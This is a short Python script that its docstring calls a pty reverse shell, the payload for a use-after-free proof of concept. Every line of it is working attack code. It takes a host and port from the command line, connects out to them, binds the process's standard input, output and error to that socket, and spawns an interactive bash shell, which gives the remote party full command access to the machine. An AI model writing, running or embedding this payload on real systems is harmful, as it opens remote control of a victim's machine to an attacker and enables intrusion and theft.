"""uaf_shell.py — python3 pty reverse shell (payload for the UAF PoC)."""
import os, pty, socket, sys
h, p = sys.argv[1], int(sys.argv[2])
s = socket.create_connection((h, p))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
os.environ.setdefault('TERM', 'vt100')
pty.spawn(["/bin/bash", "-i"])
